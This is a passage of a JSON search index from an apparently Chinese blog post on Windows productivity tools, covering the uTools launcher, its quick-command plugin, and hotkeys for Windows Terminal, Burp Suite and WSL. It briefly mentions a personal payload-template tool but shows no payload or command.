\u6109\u5feb\u5730\u4eab\u53d7","title":"\u4f7f\u7528"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#utools","text":"\u8fd9\u4e2a\u5de5\u5177\u662f\u5feb\u901f\u542f\u52a8\u5de5\u5177\uff0c\u540c\u7c7b\u8f6f\u4ef6\u6709wox\uff0cAlfred\u7b49\uff0c\u6700\u7ec8\u9009\u62e9utools\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e2a\u5de5\u5177\u4e0b\u6709\u4e2a\u795e\u7ea7\u63d2\u4ef6\uff1a \u5feb\u6377\u547d\u4ee4","title":"utools"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u5b89\u88c5_2","text":"\u76f4\u63a5\u53bb\u5b98\u7f51\u4e0b\u8f7d\u5b89\u88c5\u5373\u53ef","title":"\u5b89\u88c5"},{"location":"%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/#\u4f7f\u7528\u6280\u5de7","text":"\u4fee\u6539\u542f\u52a8\u5feb\u6377\u952e\uff0c\u6211\u4e2a\u4eba\u662f\u559c\u6b22\u8bbe\u7f6e\u4e3aAlt+`\u8fd9\u4e2a\u952e\u4f4d \u5b89\u88c5 \u5feb\u6377\u547d\u4ee4 \u8fd9\u4e2a\u63d2\u4ef6\uff0c\u7136\u540e\u5c31\u80fd\u6109\u5feb\u5730\u53bb\u5b9e\u73b0\u8bb8\u591a\u529f\u80fd\uff0c\u4f8b\u5982\u642d\u914d\u6211\u7f16\u5199\u7684 \u5de5\u5177 \u5feb\u901f\u6839\u636e\u6a21\u677f\u751f\u6210payload\uff0c\u5e76\u4e14\u4f1a\u81ea\u52a8\u590d\u5236\u5230\u526a\u5207\u677f\u91cc\uff0c\u4f8b\u5982\u53cd\u5f39shell\u7684payload,\u4f8b\u5982\uff1a \u66f4\u591a\u7684\u529f\u80fd\u53ef\u4ee5\u81ea\u5df1\u53bb\u7814\u7a76\uff08 \u8bbe\u7f6e\u5168\u5c40\u5feb\u6377\u952e\uff0c\u4f8b\u5982\u6211\u8bbe\u7f6eCtrl + Alt + T\u5feb\u901f\u6253\u5f00windows terminal\uff0cCtrl + Alt + B\u5feb\u901f\u6253\u5f00Burpsuite \u8d85\u7ea7\u9762\u677f\uff0c\u770b\u7740\u7528\uff0c\u6709\u65f6\u5019\u8fd8\u633a\u65b9\u4fbf\u7684\uff0c\u6bd4\u5982\u6211\u5199\u4e86\u4e2a\u5feb\u6377\u547d\u4ee4\uff0c\u5c06\u9009\u4e2d\u7684\u6587\u4ef6\u5feb\u901f\u4e22\u5230wsl\u91cc","title":"\u4f7f\u7528\u6280\u5de7"}]}